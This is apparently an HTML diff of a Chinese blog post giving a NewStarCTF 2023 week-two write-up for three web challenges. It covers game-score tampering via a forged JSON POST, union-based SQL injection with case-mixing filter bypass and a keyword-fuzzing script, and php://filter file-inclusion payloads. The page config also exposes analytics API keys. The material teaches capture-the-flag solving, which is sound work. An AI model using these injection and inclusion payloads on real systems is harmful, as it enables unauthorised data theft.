@@ -1,0 +1,893 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="South">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="NewStarCTF 2023_第二周WP游戏高手 本题是一道游戏题，按照惯例，我们需要先查看的js: 得到一个app_v2.js文件，以及我们需要获得100000分才能显示flag 访问app_v2.js文件,我们直接定位到游戏结束时的处理代码: 显示一个alert提示框，使用ctrl+f寻找该提示框的具体位置: 在该代码中我们发现了api.php文件，对其进行访问:  对js代码进行代码审计:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStarCTF 2023_第二周WP">
+<meta property="og:url" content="http://example.com/2023/10/09/2023-10-9-newstarweek2/index.html">
+<meta property="og:site_name" content="South">
+<meta property="og:description" content="NewStarCTF 2023_第二周WP游戏高手 本题是一道游戏题，按照惯例，我们需要先查看的js: 得到一个app_v2.js文件，以及我们需要获得100000分才能显示flag 访问app_v2.js文件,我们直接定位到游戏结束时的处理代码: 显示一个alert提示框，使用ctrl+f寻找该提示框的具体位置: 在该代码中我们发现了api.php文件，对其进行访问:  对js代码进行代码审计:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004153201791.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004153237481.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004153442164.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004153543915.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004153645105.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004154912262.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004155124328.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004155156692.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004155327273.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004160721249.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004162813880.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004160824030.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004160937013.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004163106775.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004164025606.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004164224393.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004170217827.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004170857984.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004171344082.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004171830952.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004172115084.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004172603995.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004172835389.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004172930848.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004173020270.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004173154948.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004175532104.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004175916496.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004212050514.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004212637348.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004232607329.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004232730086.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004234434183.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004234547770.png">
+<meta property="og:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004234627391.png">
+<meta property="article:published_time" content="2023-10-09T04:00:31.910Z">
+<meta property="article:modified_time" content="2023-10-09T04:09:58.739Z">
+<meta property="article:author" content="South">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/2023-10-9-Newstar-2/image-20231004153201791.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>NewStarCTF 2023_第二周WP - South</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","app_key":"PmUqfFPhyiQDRYmHOO0IXjTV","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>South</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NewStarCTF 2023_第二周WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-09 12:00" pubdate>
+          2023年10月9日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NewStarCTF 2023_第二周WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NewStarCTF-2023-第二周WP"><a href="#NewStarCTF-2023-第二周WP" class="headerlink" title="NewStarCTF 2023_第二周WP"></a>NewStarCTF 2023_第二周WP</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004153201791.png" srcset="/img/loading.gif" lazyload alt="image-20231004153201791"></p>
+<p>本题是一道游戏题，按照惯例，我们需要先查看的js:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153237481.png" srcset="/img/loading.gif" lazyload alt="image-20231004153237481"></p>
+<p>得到一个app_v2.js文件，以及我们需要获得100000分才能显示flag</p>
+<p>访问app_v2.js文件,我们直接定位到游戏结束时的处理代码:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153442164.png" srcset="/img/loading.gif" lazyload alt="image-20231004153442164"></p>
+<p>显示一个alert提示框，使用ctrl+f寻找该提示框的具体位置:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153543915.png" srcset="/img/loading.gif" lazyload alt="image-20231004153543915"></p>
+<p>在该代码中我们发现了api.php文件，对其进行访问:</p>
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004153645105.png" srcset="/img/loading.gif" lazyload alt="image-20231004153645105"></p>
+<p>对js代码进行代码审计:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//游戏结束</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-comment">//创建了一个新的XMLHttpRequest对象。XMLHttpRequest对象是用于在后台与服务器交换数据的JavaScript API。它可以通过HTTP或HTTPS协议发送HTTP请求，并接收服务器的响应。</span><br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-comment">//使用post请求打开一个api.php文件，并形成网页对象存储到xhr中</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//xhr网页建立一个网页请求头Content-Type，内容为application/json</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-comment">//创建一个json数据对象</span><br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-comment">//score是键，gameScore是value</span><br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        <span class="hljs-comment">//将json数据传输给xhr网页对象</span><br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br>	<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>	gameScore=<span class="hljs-number">0</span>;  <br>	curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>	hero = <span class="hljs-literal">null</span>;<br>	hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();  	    <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>根据代码审计我们需要传输一个json数据给网页，这个json数据就是我们游戏的分数，使用bp抓包，在api.php所在网页传输一个json数据:<br>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type:application/json<br><br>&#123;<br>   &quot;score&quot;:100000000000<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004154912262.png" srcset="/img/loading.gif" lazyload alt="image-20231004154912262"></p>
+<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004155124328.png" srcset="/img/loading.gif" lazyload alt="image-20231004155124328"></p>
+<p>我们在url中发现存在sql注入点:<br><img src="/images/2023-10-9-Newstar-2/image-20231004155156692.png" srcset="/img/loading.gif" lazyload alt="image-20231004155156692"></p>
+<p>猜测可能是通过id在数据库中寻找存在的记录然后回显到页面:<br>测试该网页是否存在sql报错:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004155327273.png" srcset="/img/loading.gif" lazyload alt="image-20231004155327273"></p>
+<p>发现网页不会回显报错信息，但是会回显数据库中搜索到，并返回的结果集，所以我们可以试试一下union注入法:</p>
+<p>第一步：由于union注入需要确切知道select返回的字段数，所以需要先爆数据库的字段:</p>
+<p>payload(order by,group by,union select 1,2,3,….):</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1 -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004160721249.png" srcset="/img/loading.gif" lazyload alt="image-20231004160721249"></p>
+<p>发现有过滤,使用脚本扫一下有哪些关键词过滤:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list=[]<br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://64a5def2-4e23-45a6-a6e6-22ec898fc9f2.node4.buuoj.cn:81/?id=&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    da = data<br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(data)</span><br>    <span class="hljs-comment"># da = &quot;1&#123;&#125;&quot;.format(data)</span><br>    da = <span class="hljs-string">&quot;1&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data)<br>    r = requests.get(url+da)<br>    <span class="hljs-comment"># 使用time使请求能够拥有足够的时间去响应</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># 获取过滤网站响应信息</span><br>    reponse_txt = <span class="hljs-string">&quot;no!&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     # da = d</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(d)</span><br><span class="hljs-comment">#     da = d</span><br><span class="hljs-comment">#     # POST传输json数据</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;query&quot;:da</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     reponse_txt = &quot;Nonono&quot;</span><br><span class="hljs-comment">#     # print(r.text)</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(d)</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(d))</span><br><br><br><span class="hljs-built_in">print</span>(black_list)<br></code></pre></td></tr></table></figure>
+
+<p>输出:</p>
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004162813880.png" srcset="/img/loading.gif" lazyload alt="image-20231004162813880"></p>
+<p>我们先尝试使用大小写绕过法:</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1 -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004160824030.png" srcset="/img/loading.gif" lazyload alt="image-20231004160824030"></p>
+<p>发现绕过！！！</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,2,3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004160937013.png" srcset="/img/loading.gif" lazyload alt="image-20231004160937013"></p>
+<p>发现回显内容，所以可以确定select返回结果集的字段个数为5</p>
+<p>第二步：爆数据库</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,database(),3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004163106775.png" srcset="/img/loading.gif" lazyload alt="image-20231004163106775"></p>
+<p>得到数据库:ctf</p>
+<p>第三步：爆表:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">常规:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables Where table_schema= DATABASE(); -- &#x27;<br>暴力方式:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p>常规:</p>
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004164025606.png" srcset="/img/loading.gif" lazyload alt="image-20231004164025606"></p>
+<p>暴力:</p>
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004164224393.png" srcset="/img/loading.gif" lazyload alt="image-20231004164224393"></p>
+<p>最终我们发现一个关键的表:here_is_flag</p>
+<p>第四步：爆表的字段:</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,Group_concat(column_name),3,4,5 from infOrmation_schema.COLUMNS Where table_schema = &#x27;ctf&#x27; And table_name = &#x27;here_is_flag&#x27;; -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004170217827.png" srcset="/img/loading.gif" lazyload alt="image-20231004170217827"></p>
+<p>得到字段flag</p>
+<p>第五步：爆字段的值:</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1&#x27;union Select 1,Group_concat(flag),3,4,5 from here_is_flag -- &#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004170857984.png" srcset="/img/loading.gif" lazyload alt="image-20231004170857984"></p>
+<p>获得flag</p>
+<h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>代码审计:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-comment">//这里过滤了base编码和rot编码获取文件包含信息</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-comment">//存在文件包含漏洞</span><br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br></code></pre></td></tr></table></figure>
+
+<p>提供文件包含漏洞的payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.quoted-printable-encode/resource=flag.php<br>php://filter/read=convert.url-encode/resource=flag.php<br>php://filter/read=convert.base64-decode/resource=flag.php<br>php://filter/read=convert.base64url-decode/resource=flag.php<br>php://filter/read=convert.rot13/resource=flag.php<br>php://filter/read=convert.hex/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br>php://filter/read=convert.quoted-printable-decode/resource=flag.php<br>php://filter/read=convert.base64url-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004171344082.png" srcset="/img/loading.gif" lazyload alt="image-20231004171344082"></p>
